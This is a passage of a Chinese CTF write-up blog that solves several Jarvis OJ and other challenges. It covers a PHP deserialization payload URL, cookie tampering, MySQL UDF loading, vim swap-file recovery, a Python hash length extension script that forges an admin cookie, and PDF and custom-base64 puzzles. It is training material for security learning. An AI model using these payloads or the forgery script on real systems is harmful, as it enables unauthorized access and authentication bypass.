constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\\'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean constant">FALSE</span><span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'pctf'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"File not found!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>get传参，base64加密参数，并且进行过滤，过滤   ..   切换目录的操作，还有pctf字符串。<br />再读取index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shield.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>new了一个Shield对象，get进行传参，并且进行了反序列化处理。<br />尝试读取一下shield.php(c2hpZWxkLnBocA==)<br /><img src="https://img-blog.csdnimg.cn/img_convert/868d70b6a0b703b629f5bc91e4f2c773.png" alt="image.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in pctf.php</span><span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> file <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean constant">FALSE</span>  <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\\'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下pctf.php<br />发现file not found<br />因为前面将pctf过滤了，所以可以利用反序列化漏洞，先将序列化结果跑出来<br /><img src="https://img-blog.csdnimg.cn/img_convert/629307fba54a066e4aaccfcbf0d5190c.png" alt="image.png" loading="lazy"><br />O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}<br />payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://web.jarvisoj.com:32768/?class<span class="token operator">=</span>O:6:%22Shield%22:1:<span class="token punctuation">&#123;</span>s:4:%22file%22<span class="token punctuation">;</span>s:8:%22pctf.php%22<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>注释的，在源码里。<br /><img src="https://img-blog.csdnimg.cn/img_convert/afce5f78390754e87c7937abf60f7db2.png" alt="image.png" loading="lazy"><br />参考博客——<a href="https://www.cnblogs.com/gaonuoqi/p/11649250.html">web—神盾局的秘密</a><br><a name="HChIH"></a></p><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>没有发现信息，所以就进行dirsearch<br />发现了robots.txt，在robots.txt中看到了Disallow: /admin_s3cr3t.php<br />访问看到flag{hello, guest}，虽然猜到可能不是flag，但是还是尝试了一下。<br />果然不行，所以看看数据包的情况<br /><img src="https://img-blog.csdnimg.cn/img_convert/6128d5d8faaefacdc691d5ccb5f559fd.png" alt="image.png" loading="lazy"><br />根据以前的做题经验，这个地方应该有问题，所以抓包修改了一下，admin=1<br />就看到了<img src="https://img-blog.csdnimg.cn/img_convert/38da3630cd4e559257abf7d5fa948f34.png" alt="image.png" loading="lazy"><br><a name="5uqDa"></a></p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p><img src="https://img-blog.csdnimg.cn/2020091916372713.png#pic_center" alt="m0re" loading="lazy"><br>emmm不会，了解的知识太太太太太太少了。参考大佬wp<br>关于mysql扩展函数</p><blockquote><p>有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，使用者自行添加的MySQL函数就称为UDF(User Define Function)。</p></blockquote><p>题目中提示help_me函数挺有意思<br>在mysql命令行中使用<code>select @@plugin_dir;</code>查看mysql的插件目录<br><img src="https://img-blog.csdnimg.cn/20200919171000838.png#pic_center" alt="m0re" loading="lazy"><br>切换到该目录，下载源文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</code></pre><p>然后重命名为udf.so<br><img src="https://img-blog.csdnimg.cn/20200919171200817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后在命令行中创建help_me外部函数</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> help_me <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'udf.so'</span><span class="token punctuation">;</span></code></pre><p>然后调用help_me函数<br><img src="https://img-blog.csdnimg.cn/20200919171450389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发现还要调用getflag函数，所以再次创建函数<br><img src="https://img-blog.csdnimg.cn/20200919171931642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>看到这样只允许admin访问的页面，看看响应包<br><img src="https://img-blog.csdnimg.cn/20200919173250610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>设置了cookie，是guest用户的，如果是admin的怎么修改？<br>尝试简单修改一下，结果很正常的失败了。<br>然后还进行了爆破，看看有无其他敏感文件和目录。<br><img src="https://img-blog.csdnimg.cn/20200919173046638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后发现<code>index.php~</code>是可以访问的。是一个文件，应该是泄露数据。<br>但是打开是乱码，所以就拉到kali中使用file命令查看一下文件类型<br>发现是一个swap文件，是vim的，所以使用vim打开，但是还是乱码，尝试直接cat该文件<br><img src="https://img-blog.csdnimg.cn/20200919175153236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发现了内容，但是不是很直观。所以查到了该文件类型，是可复原的文件<br><img src="https://img-blog.csdnimg.cn/20200919175411317.png#pic_center" alt="m0re" loading="lazy"><br>所以可以使用<code>vim -r</code>来恢复数据<br>得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php $auth = false;$role = "guest";$salt = if (isset($_COOKIE["role"])) &#123;$role = unserialize($_COOKIE["role"]);$hsh = $_COOKIE["hsh"];if ($role==="admin" &amp;&amp; $hsh ===md5($salt.strrev($_COOKIE["role"]))) &#123;$auth = true;&#125; else &#123;$auth = false;&#125;&#125; else &#123;$s = serialize($role);setcookie('role',$s);$hsh = md5($salt.strrev($s));setcookie('hsh',$hsh);&#125;if ($auth) &#123;echo "&lt;h3>Welcome Admin. Your flag is &#125; else &#123;echo "&lt;h3>Only Admin can see the flag!!&lt;/h3>";&#125;?></span></code></pre><p>查阅资料发现是哈希长度拓展攻击，<br>由于不知道<code>$salt</code>的长度，所以要进行爆破，需要用到一个工具<br>hashpumpy，安装方法——<code>https://www.cnblogs.com/pcat/p/5478509.html</code><br>爆破脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>hashpumpy<span class="token punctuation">,</span>urllib<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://web.jarvisoj.com:32778/'</span>    old_cookie <span class="token operator">=</span> <span class="token string">'3a4727d57463f122833d9e732f94e4e0'</span>    str1 <span class="token operator">=</span> <span class="token string">'s:5:"guest";'</span>    str2 <span class="token operator">=</span> <span class="token string">'s:5:"admin";'</span>    str1 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                           <span class="token comment">#倒过来,这道题要role的值反过来求md5</span>    str2 <span class="token operator">=</span> str2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                       <span class="token comment">#用于爆破salt的长度</span>        new_cookie<span class="token punctuation">,</span>message <span class="token operator">=</span> hashpumpy<span class="token punctuation">.</span>hashpump<span class="token punctuation">(</span>old_cookie<span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span>i<span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'role'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>message<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'hsh'</span><span class="token punctuation">:</span>new_cookie<span class="token punctuation">&#125;</span>           <span class="token comment">#quote()可以把 \x00 变成 %00</span>        ans <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies <span class="token operator">=</span> payload<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'welcome'</span> <span class="token keyword">in</span> ans<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#print(urllib.parse.quote('\x00'))</span>attack<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行结果</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">12</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>Web <span class="token number">35</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>style <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text/css"</span><span class="token operator">></span>body <span class="token punctuation">&#123;</span>background:gray<span class="token punctuation">;</span>text-align:center<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span>/style<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">3</span>></span>Welcome Admin. Your flag is PCTF<span class="token punctuation">&#123;</span>H45h_ext3ndeR_i5_easy_to_us3<span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">3</span>></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><h3 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h3><p>下载，在010editor中看到是PDF文件，但是flag被图片挡住了，所以需要编辑PDF进行移开，这里使用金山PDF进行编辑，因为其他的没试过，听说不行。所以专门下载了一个金山PDF独立版的。<br /><img src="https://img-blog.csdnimg.cn/img_convert/7fbb2c9e1294aabdbb27cae10cd2c772.png" alt="image.png" loading="lazy"><br />可以看到下面的字符串了，进行hex转str<br /><img src="https://img-blog.csdnimg.cn/img_convert/aaf782b45e2b0847707dbd33e933ecd8.png" alt="image.png" loading="lazy"><br><code>wctf2020&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;</code></p><h3 id="这是base"><a href="#这是base" class="headerlink" title="这是base??"></a>这是base??</h3><pre class="language-bash" data-language="bash"><code class="language-bash">dict:<span class="token punctuation">&#123;</span><span class="token number">0</span>: <span class="token string">'J'</span>, <span class="token number">1</span>: <span class="token string">'K'</span>, <span class="token number">2</span>: <span class="token string">'L'</span>, <span class="token number">3</span>: <span class="token string">'M'</span>, <span class="token number">4</span>: <span class="token string">'N'</span>, <span class="token number">5</span>: <span class="token string">'O'</span>, <span class="token number">6</span>: <span class="token string">'x'</span>, <span class="token number">7</span>: <span class="token string">'y'</span>, <span class="token number">8</span>: <span class="token string">'U'</span>, <span class="token number">9</span>: <span class="token string">'V'</span>, <span class="token number">10</span>: <span class="token string">'z'</span>, <span class="token number">11</span>: <span class="token string">'A'</span>, <span class="token number">12</span>: <span class="token string">'B'</span>, <span class="token number">13</span>: <span class="token string">'C'</span>, <span class="token number">14</span>: <span class="token string">'D'</span>, <span class="token number">15</span>: <span class="token string">'E'</span>, <span class="token number">16</span>: <span class="token string">'F'</span>, <span class="token number">17</span>: <span class="token string">'G'</span>, <span class="token number">18</span>: <span class="token string">'H'</span>, <span class="token number">19</span>: <span class="token string">'7'</span>, <span class="token number">20</span>: <span class="token string">'8'</span>, <span class="token number">21</span>: <span class="token string">'9'</span>, <span class="token number">22</span>: <span class="token string">'P'</span>, <span class="token number">23</span>: <span class="token string">'Q'</span>, <span class="token number">24</span>: <span class="token string">'I'</span>, <span class="token number">25</span>: <span class="token string">'a'</span>, <span class="token number">26</span>: <span class="token string">'b'</span>, <span class="token number">27</span>: <span class="token string">'c'</span>, <span class="token number">28</span>: <span class="token string">'d'</span>, <span class="token number">29</span>: <span class="token string">'e'</span>, <span class="token number">30</span>: <span class="token string">'f'</span>, <span class="token number">31</span>: <span class="token string">'g'</span>, <span class="token number">32</span>: <span class="token string">'h'</span>, <span class="token number">33</span>: <span class="token string">'i'</span>, <span class="token number">34</span>: <span class="token string">'j'</span>, <span class="token number">35</span>: <span class="token string">'k'</span>, <span class="token number">36</span>: <span class="token string">'l'</span>, <span class="token number">37</span>: <span class="token string">'m'</span>, <span class="token number">38</span>: <span class="token string">'W'</span>, <span class="token number">39</span>: <span class="token string">'X'</span>, <span class="token number">40</span>: <span class="token string">'Y'</span>, <span class="token number">41</span>: <span class="token string">'Z'</span>, <span class="token number">42</span>: <span class="token string">'0'</span>, <span class="token number">43</span>: <span class="token string">'1'</span>, <span class="token number">44</span>: <span class="token string">'2'</span>, <span class="token number">45</span>: <span class="token string">'3'</span>, <span class="token number">46</span>: <span class="token string">'4'</span>, <span class="token number">47</span>: <span class="token string">'5'</span>, <span class="token number">48</span>: <span class="token string">'6'</span>, <span class="token number">49</span>: <span class="token string">'R'</span>, <span class="token number">50</span>: <span class="token string">'S'</span>, <span class="token number">51</span>: <span class="token string">'T'</span>, <span class="token number">52</span>: <span class="token string">'n'</span>, <span class="token number">53</span>: <span class="token string">'o'</span>, <span class="token number">54</span>: <span class="token string">'p'</span>, <span class="token number">55</span>: <span class="token string">'q'</span>, <span class="token number">56</span>: <span class="token string">'r'</span>, <span class="token number">57</span>: <span class="token string">'s'</span>, <span class="token number">58</span>: <span class="token string">'t'</span>, <span class="token number">59</span>: <span class="token string">'u'</span>, <span class="token number">60</span>: <span class="token string">'v'</span>, <span class="token number">61</span>: <span class="token string">'w'</span>, <span class="token number">62</span>: <span class="token string">'+'</span>, <span class="token number">63</span>: <span class="token string">'/'</span>, <span class="token number">64</span>: <span class="token string">'='</span><span class="token punctuation">&#125;</span>chipertext:FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</code></pre><p>dict原本以为是字典，需要一个一个对照，做了一遍发现不是这样的。<br />64个字符，base64………..emmm=.=<br /><img src="https://img-blog.csdnimg.cn/img_convert/007c86e5dc85b9054c72248f188b8b5e.png" alt="image.png" loading="lazy">转换表显示63个，第64个是“=”<br />使用python写个脚本的话，参考一下python字典<br /><img src="https://img-blog.csdnimg.cn/img_convert/ff68583c230f3a14bf5069078c050e44.png" alt="image.png" loading="lazy"><br />所以参考大佬的脚本，写了一下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token builtin">dict</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">:</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">:</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">:</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">:</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">:</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">:</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">:</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">:</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">:</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">:</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">:</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">:</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">:</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">:</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">:</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">:</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">:</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">:</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">:</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">:</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">:</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">:</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">:</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">:</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">:</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">:</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">:</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">:</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">:</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">:</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">:</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">:</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">:</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">:</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">:</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">:</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">:</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">:</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">:</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">:</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">:</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">:</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">:</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">:</span> <span class="token string">'='</span><span class="token punctuation">&#125;</span>base64_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token 